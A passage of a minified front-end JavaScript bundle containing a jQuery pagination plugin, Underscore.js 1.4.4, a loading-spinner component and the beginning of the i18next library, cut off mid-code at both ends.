e.originalEvent&&(isNaN(e.originalEvent.deltaY)?isNaN(e.originalEvent.wheelDelta)||(e.wheelDelta=e.originalEvent.wheelDelta):e.wheelDelta=-1*e.originalEvent.deltaY),e.wheelDelta<0||e.detail>0?e.delta=-1:(e.wheelDelta>0||e.detail<0)&&(e.delta=1),t(this).trigger(e)}},t.fn.paginator=function(e){function n(t){return d.baseUrl[0]+d.buildCounter(t)+d.baseUrl[1]}function r(){minWidth=h.scrollThumb.width(),h.scrollThumb.width(d.pagesSpan/d.pagesTotal*100+"%"),h.scrollThumb.width()<minWidth&&h.scrollThumb.width(minWidth+"px")}function o(){h.scrollThumb.css("left",h.scrollThumb.xPos+"px")}function s(){minWidth=h.pageCurrentMark.width(),h.pageCurrentMark.css("width",100/d.pagesTotal+"%"),h.pageCurrentMark.width()<minWidth&&h.pageCurrentMark.css("width",minWidth+"px")}function a(){pos=d.pageCurrent/d.pagesTotal*h.table.workWidth,pos=d.returnOrder?h.table.workWidth-pos:pos-h.pageCurrentMark.width(),pos=pos>h.table.workWidth-h.pageCurrentMark.width()?h.table.workWidth-h.pageCurrentMark.width():pos,pos=pos<0?0:pos,h.pageCurrentMark.css("left",pos+"px")}function l(){for(h.scrollThumb.xPos=h.scrollThumb.xPos>h.table.maxWidth?h.table.maxWidth:h.scrollThumb.xPos,h.scrollThumb.xPos=h.scrollThumb.xPos<0?0:h.scrollThumb.xPos,xPos=d.returnOrder?h.table.maxWidth-h.scrollThumb.xPos:h.scrollThumb.xPos,percentFromLeft=xPos/h.table.workWidth,cellFirstValue=xPos==h.table.maxWidth?cellFirstValue=d.pagesTotal-h.tdsPages.length+1:Math.ceil(percentFromLeft*d.pagesTotal),cellFirstValue=cellFirstValue<1?1:cellFirstValue,o(),i=0;i<h.tdsPages.length;i++)cellCurrentValue=cellFirstValue+i,data=cellCurrentValue==d.pageCurrent?"<strong>"+cellCurrentValue+"</strong>":'<a href="'+n(cellCurrentValue)+'">'+cellCurrentValue+"</a>",index=d.returnOrder?d.pagesSpan-i-1:i,h.tdsPages.eq(index).html(data),t.isFunction(d.clickHandler)&&t("a",h.tdsPages[index]).bind("click",(function(){return c(t(this).text())}))}function c(e){for(e=parseInt(e),lastPage=d.pageCurrent,d.pageCurrent=e,$links=t(h.holder).find('a[rel!=""]'),i=0;i<$links.length;i++)pageNumber=parseInt($links.eq(i).attr("rel")),1!=pageNumber&&pageNumber!=d.pagesTotal&&(pageNumber=pageNumber-lastPage+e,pageNumber=pageNumber<1?1:pageNumber,pageNumber=pageNumber>d.pagesTotal?d.pagesTotal:pageNumber,$links.eq(i).attr("rel",pageNumber),$links.eq(i).attr("href",n(pageNumber)));return a(),l(),d.clickHandler(d.buildCounter(d.pageCurrent))}function u(t){return t}var d={pagesTotal:1,pagesSpan:10,pageCurrent:1,baseUrl:document.location.href+"&page=%number%",buildCounter:u,pageScroll:3,clickHandler:null,returnOrder:!1,lang:{next:"Next",last:"Last",prior:"Prior",first:"First",arrowRight:String.fromCharCode(8594),arrowLeft:String.fromCharCode(8592)},events:{keyboard:!0,scroll:!0}};for((d=t.extend(!0,d,e)).pagesSpan=d.pagesSpan<d.pagesTotal?d.pagesSpan:d.pagesTotal,d.pageCurrent=d.pagesTotal<d.pageCurrent?d.pagesTotal:d.pageCurrent,d.baseUrl.match(/%number%/i)||(d.baseUrl+="%number%"),d.baseUrl=d.baseUrl.split("%number%"),t.isFunction(d.buildCounter)||(d.buildCounter=u),next_page=parseInt(d.pageCurrent)<parseInt(d.pagesTotal)?parseInt(d.pageCurrent)+1:d.pagesTotal,next='<a href="'+n(next_page)+'" rel="'+next_page+'">%next%</a>',last='<a href="'+n(d.pagesTotal)+'" rel="'+d.pagesTotal+'">%last%</a>',prior_page=parseInt(d.pageCurrent)>1?parseInt(d.pageCurrent)-1:1,prior='<a href="'+n(prior_page)+'" rel="'+prior_page+'">%prior%</a>',first='<a href="'+n(1)+'" rel="1">%first%</a>',top_left=bottom_left=top_right=bottom_right="",d.returnOrder?(top_left=next.replace(/%next%/,d.lang.arrowLeft+" "+d.lang.next),bottom_left=last.replace(/%last%/,d.lang.last),top_right=prior.replace(/%prior%/,d.lang.prior+" "+d.lang.arrowRight),bottom_right=first.replace(/%first%/,d.lang.first)):(top_right=next.replace(/%next%/,d.lang.next+" "+d.lang.arrowRight),bottom_right=last.replace(/%last%/,d.lang.last),top_left=prior.replace(/%prior%/,d.lang.arrowLeft+" "+d.lang.prior),bottom_left=first.replace(/%first%/,d.lang.first)),tdWidth=Math.ceil(100/(d.pagesSpan+2))+"%",code='<table width="100%"><tr><td class="left top">'+top_left+'</td><td class="spaser" /><td rowspan="2" align="center"><table><tr>',i=1;i<=d.pagesSpan;i++)code+='<td width="'+tdWidth+'"><span></span></td>';code+='</tr><tr><td colspan="'+d.pagesSpan+'"><div class="scroll_bar"><div class="scroll_trough" /><div class="scroll_thumb"><div class="scroll_knob" /></div><div class="current_page_mark" /></div></td></tr></table></td><td class="spaser" /><td class="right top">'+top_right+'</td></tr><tr><td class="left bottom">'+bottom_left+'</td><td class="spaser" /><td class="spaser" /><td class="right bottom">'+bottom_right+"</td></tr></table>",t(this).html(code);var h={holder:t(this),table:t("table:last",this),trPages:t("table:last tr:first",this),tdsPages:t("table:last tr:first td span",this),scrollBar:t("div.scroll_trough",this),scrollThumb:t("div.scroll_thumb",this),pageCurrentMark:t("div.current_page_mark",this)};if(r(),h.table.workWidth=h.table.width(),h.table.maxWidth=h.table.width()-h.scrollThumb.width(),h.scrollThumb.xPos=d.returnOrder?(d.pagesTotal-d.pageCurrent-d.pagesSpan/2)/d.pagesTotal*h.table.workWidth:(d.pageCurrent-d.pagesSpan/2)/d.pagesTotal*h.table.workWidth,s(),a(),l(),t(window).resize((function(){s(),a(),r()})),t.isFunction(d.clickHandler)&&t(h.holder).find('a[rel!=""]').bind("click",(function(e){return c(t(this).attr("rel"))})),t(h.scrollThumb).bind("mousedown",(function(e){var n=e.pageX-h.scrollThumb.xPos;t(document).bind("mousemove",(function(t){h.scrollThumb.xPos=(d.returnOrder,t.pageX-n),l()})),t(document).bind("mouseup",(function(){t(document).unbind("mousemove"),function(t){t.onselectstart=function(){return!0},t.unselectable="on",t.css("-moz-user-select","none")}(h.holder)})),function(t){document.onselectstart=function(){return!1},t.unselectable="on",t.css("-moz-user-select","none"),h.scrollThumb.focus()}(h.holder)})),t(h.scrollBar).add(h.pageCurrentMark).bind("click",(function(e){h.scrollThumb.xPos=e.pageX-t(h.scrollBar).offset().left-Math.ceil(h.scrollThumb.width()/2),o(),l()})),d.events.keyboard&&t(document).keydown((function(e){if(e.ctrlKey)switch(e.keyCode?e.keyCode:e.which?e.which:null){case 37:el=t(d.returnOrder?".right.top a":".left.top a",h.holder),t.isFunction(d.clickHandler)?el.click():document.location.href=el.attr("href");break;case 39:el=t(d.returnOrder?".left.top a":".right.top a",h.holder),t.isFunction(d.clickHandler)?el.click():document.location.href=el.attr("href")}})),d.events.scroll){t(h.holder).bind("wheel",(function(t){return h.scrollThumb.xPos+=t.delta*(d.returnOrder?-1:1)*(h.table.workWidth/d.pagesTotal),l(),!1}));let e=0;t(h.holder).on("touchmove",(function(t){const n=(((t.originalEvent||{}).touches||[])[0]||{}).screenX;let i=0;n&&(e?(i=n>e?.3:-.3,e=n,h.scrollThumb.xPos+=i*(d.returnOrder?-1:1)*(h.table.workWidth/d.pagesTotal),l()):e=n)}))}}}(jQuery),function(){var t=this,e=t._,n={},i=Array.prototype,r=Object.prototype,o=Function.prototype,s=i.push,a=i.slice,l=i.concat,c=r.toString,u=r.hasOwnProperty,d=i.forEach,h=i.map,f=i.reduce,p=i.reduceRight,g=i.filter,m=i.every,v=i.some,y=i.indexOf,b=i.lastIndexOf,w=Array.isArray,k=Object.keys,x=o.bind,_=function(t){return t instanceof _?t:this instanceof _?void(this._wrapped=t):new _(t)};"undefined"!=typeof exports?("undefined"!=typeof module&&module.exports&&(exports=module.exports=_),exports._=_):t._=_,_.VERSION="1.4.4";var S=_.each=_.forEach=function(t,e,i){if(null!=t)if(d&&t.forEach===d)t.forEach(e,i);else if(t.length===+t.length){for(var r=0,o=t.length;o>r;r++)if(e.call(i,t[r],r,t)===n)return}else for(var s in t)if(_.has(t,s)&&e.call(i,t[s],s,t)===n)return};_.map=_.collect=function(t,e,n){var i=[];return null==t?i:h&&t.map===h?t.map(e,n):(S(t,(function(t,r,o){i[i.length]=e.call(n,t,r,o)})),i)};var C="Reduce of empty array with no initial value";_.reduce=_.foldl=_.inject=function(t,e,n,i){var r=arguments.length>2;if(null==t&&(t=[]),f&&t.reduce===f)return i&&(e=_.bind(e,i)),r?t.reduce(e,n):t.reduce(e);if(S(t,(function(t,o,s){r?n=e.call(i,n,t,o,s):(n=t,r=!0)})),!r)throw new TypeError(C);return n},_.reduceRight=_.foldr=function(t,e,n,i){var r=arguments.length>2;if(null==t&&(t=[]),p&&t.reduceRight===p)return i&&(e=_.bind(e,i)),r?t.reduceRight(e,n):t.reduceRight(e);var o=t.length;if(o!==+o){var s=_.keys(t);o=s.length}if(S(t,(function(a,l,c){l=s?s[--o]:--o,r?n=e.call(i,n,t[l],l,c):(n=t[l],r=!0)})),!r)throw new TypeError(C);return n},_.find=_.detect=function(t,e,n){var i;return $(t,(function(t,r,o){return e.call(n,t,r,o)?(i=t,!0):void 0})),i},_.filter=_.select=function(t,e,n){var i=[];return null==t?i:g&&t.filter===g?t.filter(e,n):(S(t,(function(t,r,o){e.call(n,t,r,o)&&(i[i.length]=t)})),i)},_.reject=function(t,e,n){return _.filter(t,(function(t,i,r){return!e.call(n,t,i,r)}),n)},_.every=_.all=function(t,e,i){e||(e=_.identity);var r=!0;return null==t?r:m&&t.every===m?t.every(e,i):(S(t,(function(t,o,s){return(r=r&&e.call(i,t,o,s))?void 0:n})),!!r)};var $=_.some=_.any=function(t,e,i){e||(e=_.identity);var r=!1;return null==t?r:v&&t.some===v?t.some(e,i):(S(t,(function(t,o,s){return r||(r=e.call(i,t,o,s))?n:void 0})),!!r)};_.contains=_.include=function(t,e){return null!=t&&(y&&t.indexOf===y?-1!=t.indexOf(e):$(t,(function(t){return t===e})))},_.invoke=function(t,e){var n=a.call(arguments,2),i=_.isFunction(e);return _.map(t,(function(t){return(i?e:t[e]).apply(t,n)}))},_.pluck=function(t,e){return _.map(t,(function(t){return t[e]}))},_.where=function(t,e,n){return _.isEmpty(e)?n?null:[]:_[n?"find":"filter"](t,(function(t){for(var n in e)if(e[n]!==t[n])return!1;return!0}))},_.findWhere=function(t,e){return _.where(t,e,!0)},_.max=function(t,e,n){if(!e&&_.isArray(t)&&t[0]===+t[0]&&65535>t.length)return Math.max.apply(Math,t);if(!e&&_.isEmpty(t))return-1/0;var i={computed:-1/0,value:-1/0};return S(t,(function(t,r,o){var s=e?e.call(n,t,r,o):t;s>=i.computed&&(i={value:t,computed:s})})),i.value},_.min=function(t,e,n){if(!e&&_.isArray(t)&&t[0]===+t[0]&&65535>t.length)return Math.min.apply(Math,t);if(!e&&_.isEmpty(t))return 1/0;var i={computed:1/0,value:1/0};return S(t,(function(t,r,o){var s=e?e.call(n,t,r,o):t;i.computed>s&&(i={value:t,computed:s})})),i.value},_.shuffle=function(t){var e,n=0,i=[];return S(t,(function(t){e=_.random(n++),i[n-1]=i[e],i[e]=t})),i};var E=function(t){return _.isFunction(t)?t:function(e){return e[t]}};_.sortBy=function(t,e,n){var i=E(e);return _.pluck(_.map(t,(function(t,e,r){return{value:t,index:e,criteria:i.call(n,t,e,r)}})).sort((function(t,e){var n=t.criteria,i=e.criteria;if(n!==i){if(n>i||void 0===n)return 1;if(i>n||void 0===i)return-1}return t.index<e.index?-1:1})),"value")};var T=function(t,e,n,i){var r={},o=E(e||_.identity);return S(t,(function(e,s){var a=o.call(n,e,s,t);i(r,a,e)})),r};_.groupBy=function(t,e,n){return T(t,e,n,(function(t,e,n){(_.has(t,e)?t[e]:t[e]=[]).push(n)}))},_.countBy=function(t,e,n){return T(t,e,n,(function(t,e){_.has(t,e)||(t[e]=0),t[e]++}))},_.sortedIndex=function(t,e,n,i){for(var r=(n=null==n?_.identity:E(n)).call(i,e),o=0,s=t.length;s>o;){var a=o+s>>>1;r>n.call(i,t[a])?o=a+1:s=a}return o},_.toArray=function(t){return t?_.isArray(t)?a.call(t):t.length===+t.length?_.map(t,_.identity):_.values(t):[]},_.size=function(t){return null==t?0:t.length===+t.length?t.length:_.keys(t).length},_.first=_.head=_.take=function(t,e,n){return null==t?void 0:null==e||n?t[0]:a.call(t,0,e)},_.initial=function(t,e,n){return a.call(t,0,t.length-(null==e||n?1:e))},_.last=function(t,e,n){return null==t?void 0:null==e||n?t[t.length-1]:a.call(t,Math.max(t.length-e,0))},_.rest=_.tail=_.drop=function(t,e,n){return a.call(t,null==e||n?1:e)},_.compact=function(t){return _.filter(t,_.identity)};var L=function(t,e,n){return S(t,(function(t){_.isArray(t)?e?s.apply(n,t):L(t,e,n):n.push(t)})),n};_.flatten=function(t,e){return L(t,e,[])},_.without=function(t){return _.difference(t,a.call(arguments,1))},_.uniq=_.unique=function(t,e,n,i){_.isFunction(e)&&(i=n,n=e,e=!1);var r=n?_.map(t,n,i):t,o=[],s=[];return S(r,(function(n,i){(e?i&&s[s.length-1]===n:_.contains(s,n))||(s.push(n),o.push(t[i]))})),o},_.union=function(){return _.uniq(l.apply(i,arguments))},_.intersection=function(t){var e=a.call(arguments,1);return _.filter(_.uniq(t),(function(t){return _.every(e,(function(e){return _.indexOf(e,t)>=0}))}))},_.difference=function(t){var e=l.apply(i,a.call(arguments,1));return _.filter(t,(function(t){return!_.contains(e,t)}))},_.zip=function(){for(var t=a.call(arguments),e=_.max(_.pluck(t,"length")),n=Array(e),i=0;e>i;i++)n[i]=_.pluck(t,""+i);return n},_.object=function(t,e){if(null==t)return{};for(var n={},i=0,r=t.length;r>i;i++)e?n[t[i]]=e[i]:n[t[i][0]]=t[i][1];return n},_.indexOf=function(t,e,n){if(null==t)return-1;var i=0,r=t.length;if(n){if("number"!=typeof n)return t[i=_.sortedIndex(t,e)]===e?i:-1;i=0>n?Math.max(0,r+n):n}if(y&&t.indexOf===y)return t.indexOf(e,n);for(;r>i;i++)if(t[i]===e)return i;return-1},_.lastIndexOf=function(t,e,n){if(null==t)return-1;var i=null!=n;if(b&&t.lastIndexOf===b)return i?t.lastIndexOf(e,n):t.lastIndexOf(e);for(var r=i?n:t.length;r--;)if(t[r]===e)return r;return-1},_.range=function(t,e,n){1>=arguments.length&&(e=t||0,t=0),n=arguments[2]||1;for(var i=Math.max(Math.ceil((e-t)/n),0),r=0,o=Array(i);i>r;)o[r++]=t,t+=n;return o},_.bind=function(t,e){if(t.bind===x&&x)return x.apply(t,a.call(arguments,1));var n=a.call(arguments,2);return function(){return t.apply(e,n.concat(a.call(arguments)))}},_.partial=function(t){var e=a.call(arguments,1);return function(){return t.apply(this,e.concat(a.call(arguments)))}},_.bindAll=function(t){var e=a.call(arguments,1);return 0===e.length&&(e=_.functions(t)),S(e,(function(e){t[e]=_.bind(t[e],t)})),t},_.memoize=function(t,e){var n={};return e||(e=_.identity),function(){var i=e.apply(this,arguments);return _.has(n,i)?n[i]:n[i]=t.apply(this,arguments)}},_.delay=function(t,e){var n=a.call(arguments,2);return setTimeout((function(){return t.apply(null,n)}),e)},_.defer=function(t){return _.delay.apply(_,[t,1].concat(a.call(arguments,1)))},_.throttle=function(t,e){var n,i,r,o,s=0,a=function(){s=new Date,r=null,o=t.apply(n,i)};return function(){var l=new Date,c=e-(l-s);return n=this,i=arguments,0>=c?(clearTimeout(r),r=null,s=l,o=t.apply(n,i)):r||(r=setTimeout(a,c)),o}},_.debounce=function(t,e,n){var i,r;return function(){var o=this,s=arguments,a=n&&!i;return clearTimeout(i),i=setTimeout((function(){i=null,n||(r=t.apply(o,s))}),e),a&&(r=t.apply(o,s)),r}},_.once=function(t){var e,n=!1;return function(){return n||(n=!0,e=t.apply(this,arguments),t=null),e}},_.wrap=function(t,e){return function(){var n=[t];return s.apply(n,arguments),e.apply(this,n)}},_.compose=function(){var t=arguments;return function(){for(var e=arguments,n=t.length-1;n>=0;n--)e=[t[n].apply(this,e)];return e[0]}},_.after=function(t,e){return 0>=t?e():function(){return 1>--t?e.apply(this,arguments):void 0}},_.keys=k||function(t){if(t!==Object(t))throw new TypeError("Invalid object");var e=[];for(var n in t)_.has(t,n)&&(e[e.length]=n);return e},_.values=function(t){var e=[];for(var n in t)_.has(t,n)&&e.push(t[n]);return e},_.pairs=function(t){var e=[];for(var n in t)_.has(t,n)&&e.push([n,t[n]]);return e},_.invert=function(t){var e={};for(var n in t)_.has(t,n)&&(e[t[n]]=n);return e},_.functions=_.methods=function(t){var e=[];for(var n in t)_.isFunction(t[n])&&e.push(n);return e.sort()},_.extend=function(t){return S(a.call(arguments,1),(function(e){if(e)for(var n in e)t[n]=e[n]})),t},_.pick=function(t){var e={},n=l.apply(i,a.call(arguments,1));return S(n,(function(n){n in t&&(e[n]=t[n])})),e},_.omit=function(t){var e={},n=l.apply(i,a.call(arguments,1));for(var r in t)_.contains(n,r)||(e[r]=t[r]);return e},_.defaults=function(t){return S(a.call(arguments,1),(function(e){if(e)for(var n in e)null==t[n]&&(t[n]=e[n])})),t},_.clone=function(t){return _.isObject(t)?_.isArray(t)?t.slice():_.extend({},t):t},_.tap=function(t,e){return e(t),t};var O=function(t,e,n,i){if(t===e)return 0!==t||1/t==1/e;if(null==t||null==e)return t===e;t instanceof _&&(t=t._wrapped),e instanceof _&&(e=e._wrapped);var r=c.call(t);if(r!=c.call(e))return!1;switch(r){case"[object String]":return t==e+"";case"[object Number]":return t!=+t?e!=+e:0==t?1/t==1/e:t==+e;case"[object Date]":case"[object Boolean]":return+t==+e;case"[object RegExp]":return t.source==e.source&&t.global==e.global&&t.multiline==e.multiline&&t.ignoreCase==e.ignoreCase}if("object"!=typeof t||"object"!=typeof e)return!1;for(var o=n.length;o--;)if(n[o]==t)return i[o]==e;n.push(t),i.push(e);var s=0,a=!0;if("[object Array]"==r){if(a=(s=t.length)==e.length)for(;s--&&(a=O(t[s],e[s],n,i)););}else{var l=t.constructor,u=e.constructor;if(l!==u&&!(_.isFunction(l)&&l instanceof l&&_.isFunction(u)&&u instanceof u))return!1;for(var d in t)if(_.has(t,d)&&(s++,!(a=_.has(e,d)&&O(t[d],e[d],n,i))))break;if(a){for(d in e)if(_.has(e,d)&&!s--)break;a=!s}}return n.pop(),i.pop(),a};_.isEqual=function(t,e){return O(t,e,[],[])},_.isEmpty=function(t){if(null==t)return!0;if(_.isArray(t)||_.isString(t))return 0===t.length;for(var e in t)if(_.has(t,e))return!1;return!0},_.isElement=function(t){return!(!t||1!==t.nodeType)},_.isArray=w||function(t){return"[object Array]"==c.call(t)},_.isObject=function(t){return t===Object(t)},S(["Arguments","Function","String","Number","Date","RegExp"],(function(t){_["is"+t]=function(e){return c.call(e)=="[object "+t+"]"}})),_.isArguments(arguments)||(_.isArguments=function(t){return!(!t||!_.has(t,"callee"))}),"function"!=typeof/./&&(_.isFunction=function(t){return"function"==typeof t}),_.isFinite=function(t){return isFinite(t)&&!isNaN(parseFloat(t))},_.isNaN=function(t){return _.isNumber(t)&&t!=+t},_.isBoolean=function(t){return!0===t||!1===t||"[object Boolean]"==c.call(t)},_.isNull=function(t){return null===t},_.isUndefined=function(t){return void 0===t},_.has=function(t,e){return u.call(t,e)},_.noConflict=function(){return t._=e,this},_.identity=function(t){return t},_.times=function(t,e,n){for(var i=Array(t),r=0;t>r;r++)i[r]=e.call(n,r);return i},_.random=function(t,e){return null==e&&(e=t,t=0),t+Math.floor(Math.random()*(e-t+1))};var I={escape:{"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;","/":"&#x2F;"}};I.unescape=_.invert(I.escape);var A={escape:RegExp("["+_.keys(I.escape).join("")+"]","g"),unescape:RegExp("("+_.keys(I.unescape).join("|")+")","g")};_.each(["escape","unescape"],(function(t){_[t]=function(e){return null==e?"":(""+e).replace(A[t],(function(e){return I[t][e]}))}})),_.result=function(t,e){if(null==t)return null;var n=t[e];return _.isFunction(n)?n.call(t):n},_.mixin=function(t){S(_.functions(t),(function(e){var n=_[e]=t[e];_.prototype[e]=function(){var t=[this._wrapped];return s.apply(t,arguments),R.call(this,n.apply(_,t))}}))};var P=0;_.uniqueId=function(t){var e=++P+"";return t?t+e:e},_.templateSettings={evaluate:/<%([\s\S]+?)%>/g,interpolate:/<%=([\s\S]+?)%>/g,escape:/<%-([\s\S]+?)%>/g};var N=/(.)^/,B={"'":"'","\\":"\\","\r":"r","\n":"n","\t":"t","\u2028":"u2028","\u2029":"u2029"},D=/\\|'|\r|\n|\t|\u2028|\u2029/g;_.template=function(t,e,n){var i;n=_.defaults({},n,_.templateSettings);var r=RegExp([(n.escape||N).source,(n.interpolate||N).source,(n.evaluate||N).source].join("|")+"|$","g"),o=0,s="__p+='";t.replace(r,(function(e,n,i,r,a){return s+=t.slice(o,a).replace(D,(function(t){return"\\"+B[t]})),n&&(s+="'+\n((__t=("+n+"))==null?'':_.escape(__t))+\n'"),i&&(s+="'+\n((__t=("+i+"))==null?'':__t)+\n'"),r&&(s+="';\n"+r+"\n__p+='"),o=a+e.length,e})),s+="';\n",n.variable||(s="with(obj||{}){\n"+s+"}\n"),s="var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n"+s+"return __p;\n";try{i=Function(n.variable||"obj","_",s)}catch(t){throw t.source=s,t}if(e)return i(e,_);var a=function(t){return i.call(this,t,_)};return a.source="function("+(n.variable||"obj")+"){\n"+s+"}",a},_.chain=function(t){return _(t).chain()};var R=function(t){return this._chain?_(t).chain():t};_.mixin(_),S(["pop","push","reverse","shift","sort","splice","unshift"],(function(t){var e=i[t];_.prototype[t]=function(){var n=this._wrapped;return e.apply(n,arguments),"shift"!=t&&"splice"!=t||0!==n.length||delete n[0],R.call(this,n)}})),S(["concat","join","slice"],(function(t){var e=i[t];_.prototype[t]=function(){return R.call(this,e.apply(this._wrapped,arguments))}})),_.extend(_.prototype,{chain:function(){return this._chain=!0,this},value:function(){return this._wrapped}}),PARSEIT_UC=k}.call(this);var __assign=this&&this.__assign||function(){return __assign=Object.assign||function(t){for(var e,n=1,i=arguments.length;n<i;n++)for(var r in e=arguments[n])Object.prototype.hasOwnProperty.call(e,r)&&(t[r]=e[r]);return t},__assign.apply(this,arguments)},defaults={lines:12,length:7,width:5,radius:10,scale:1,corners:1,color:"#000",fadeColor:"transparent",animation:"spinner-line-fade-default",rotate:0,direction:1,speed:1,zIndex:2e9,className:"spinner",top:"50%",left:"50%",shadow:"0 0 1px transparent",position:"absolute"},Spinner=function(){function t(t){void 0===t&&(t={}),this.opts=__assign({},defaults,t)}return t.prototype.spin=function(t){return this.stop(),this.el=document.createElement("div"),this.el.className=this.opts.className,this.el.setAttribute("role","progressbar"),css(this.el,{position:this.opts.position,width:0,zIndex:this.opts.zIndex,left:this.opts.left,top:this.opts.top,transform:"scale("+this.opts.scale+")"}),t&&t.insertBefore(this.el,t.firstChild||null),drawLines(this.el,this.opts),this},t.prototype.stop=function(){return this.el&&("undefined"!=typeof requestAnimationFrame?cancelAnimationFrame(this.animateId):clearTimeout(this.animateId),this.el.parentNode&&this.el.parentNode.removeChild(this.el),this.el=void 0),this},t}();function css(t,e){for(var n in e)t.style[n]=e[n];return t}function getColor(t,e){return"string"==typeof t?t:t[e%t.length]}function drawLines(t,e){var n=Math.round(e.corners*e.width*500)/1e3+"px",i="none";!0===e.shadow?i="0 2px 4px #000":"string"==typeof e.shadow&&(i=e.shadow);for(var r=parseBoxShadow(i),o=0;o<e.lines;o++){var s=~~(360/e.lines*o+e.rotate),a=css(document.createElement("div"),{position:"absolute",top:-e.width/2+"px",width:e.length+e.width+"px",height:e.width+"px",background:getColor(e.fadeColor,o),borderRadius:n,transformOrigin:"left",transform:"rotate("+s+"deg) translateX("+e.radius+"px)"}),l=o*e.direction/e.lines/e.speed;l-=1/e.speed;var c=css(document.createElement("div"),{width:"100%",height:"100%",background:getColor(e.color,o),borderRadius:n,boxShadow:normalizeShadow(r,s),animation:1/e.speed+"s linear "+l+"s infinite "+e.animation});a.appendChild(c),t.appendChild(a)}}function parseBoxShadow(t){for(var e=/^\s*([a-zA-Z]+\s+)?(-?\d+(\.\d+)?)([a-zA-Z]*)\s+(-?\d+(\.\d+)?)([a-zA-Z]*)(.*)$/,n=[],i=0,r=t.split(",");i<r.length;i++){var o=r[i].match(e);if(null!==o){var s=+o[2],a=+o[5],l=o[4],c=o[7];0!==s||l||(l=c),0!==a||c||(c=l),l===c&&n.push({prefix:o[1]||"",x:s,y:a,xUnits:l,yUnits:c,end:o[8]})}}return n}function normalizeShadow(t,e){for(var n=[],i=0,r=t;i<r.length;i++){var o=r[i],s=convertOffset(o.x,o.y,e);n.push(o.prefix+s[0]+o.xUnits+" "+s[1]+o.yUnits+o.end)}return n.join(", ")}function convertOffset(t,e,n){var i=n*Math.PI/180,r=Math.sin(i),o=Math.cos(i);return[Math.round(1e3*(t*o+e*r))/1e3,Math.round(1e3*(-t*r+e*o))/1e3]}!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):(t=t||self).i18next=e()}(this,(function(){"use strict";function t(e){return(t="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t})(e)}function e(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function n(t){for(var n=1;n<arguments.length;n++){var i=null!=arguments[n]?Object(arguments[n]):{},r=Object.keys(i);"function"==typeof Object.getOwnPropertySymbols&&(r=r.concat(Object.getOwnPropertySymbols(i).filter((function(t){return Object.getOwnPropertyDescriptor(i,t).enumerable})))),r.forEach((function(n){e(t,n,i[n])}))}return t}function i(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}function r(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}function o(t,e,n){return e&&r(t.prototype,e),n&&r(t,n),t}function s(t){if(void 0===t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return t}function a(e,n){return!n||"object"!==t(n)&&"function"!=typeof n?s(e):n}function l(t){return(l=Object.setPrototypeOf?Object.getPrototypeOf:function(t){return t.__proto__||Object.getPrototypeOf(t)})(t)}function c(t,e){return(c=Object.setPrototypeOf||function(t,e){return t.__proto__=e,t})(t,e)}function u(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,writable:!0,configurable:!0}}),e&&c(t,e)}var d={type:"logger",log:function(t){this.output("log",t)},warn:function(t){this.output("warn",t)},error:function(t){this.output("error",t)},output:function(t,e){console&&console[t]&&console[t].apply(console,e)}},h=new(function(){function t(e){var n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};i(this,t),this.init(e,n)}return o(t,[{key:"init",value:function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};this.prefix=e.prefix||"i18next:",this.logger=t||d,this.options=e,this.debug=e.debug}},{key:"setDebug",value:function(t){this.debug=t}},{key:"log",value:function(){for(var t=arguments.length,e=new Array(t),n=0;n<t;n++)e[n]=arguments[n];return this.forward(e,"log","",!0)}},{key:"warn",value:function(){for(var t=arguments.length,e=new Array(t),n=0;n<t;n++)e[n]=arguments[n];return this.forward(e,"warn","",!0)}},{key:"error",value:function(){for(var t=arguments.length,e=new Array(t),n=0;n<t;n++)e[n]=arguments[n];return this.forward(e,"error","")}},{key:"deprecate",value:function(){for(var t=arguments.length,e=new Array(t),n=0;n<t;n++)e[n]=arguments[n];return this.forward(e,"warn","WARNING DEPRECATED: ",!0)}},{key:"forward",value:function(t,e,n,i){return i&&!this.debug?null:("string"==typeof t[0]&&(t[0]="".concat(n).concat(this.prefix," ").concat(t[0])),this.logger[e](t))}},{key:"create",value:function(e){return new t(this.logger,n({},{prefix:"".concat(this.prefix,":").concat(e,":")},this.options))}}]),t}()),f=function(){function t(){i(this,t),this.observers={}}return o(t,[{key:"on",value:function(t,e){var n=this;return t.split(" ").forEach((function(t){n.observers[t]=n.observers[t]||[],n.observers[t].push(e)})),this}},{key:"off",value:function(t,e){this.observers[t]&&(e?this.observers[t]=this.observers[t].filter((function(t){return t!==e})):delete this.observers[t])}},{key:"emit",value:function(t){for(var e=arguments.length,n=new Array(e>1?e-1:0),i=1;i<e;i++)n[i-1]=arguments[i];this.observers[t]&&[].concat(this.observers[t]).forEach((function(t){t.apply(void 0,n)})),this.observers["*"]&&[].concat(this.observers["*"]).forEach((function(e){e.apply(e,[t].concat(n))}))}}]),t}();function p(){var t,e,n=new Promise((function(n,i){t=n,e=i}));return n.resolve=t,n.reject=e,n}function g(t){return null==t?"":""+t}function m(t,e,n){function i(t){return t&&t.indexOf("###")>-1?t.replace(/###/g,"."):t}function r(){return!t||"string"==typeof t}for(var o="string"!=typeof e?[].concat(e):e.split(".");o.length>1;){if(r())return{};var s=i(o.shift());!t[s]&&n&&(t[s]=new n),t=t[s]}return r()?{}:{obj:t,k:i(o.shift())}}function v(t,e,n){var i=m(t,e,Object);i.obj[i.k]=n}function y(t,e){var n=m(t,e),i=n.obj,r=n.k;if(i)return i[r]}function b(t,e,n){var i=y(t,n);return void 0!==i?i:y(e,n)}function w(t){return 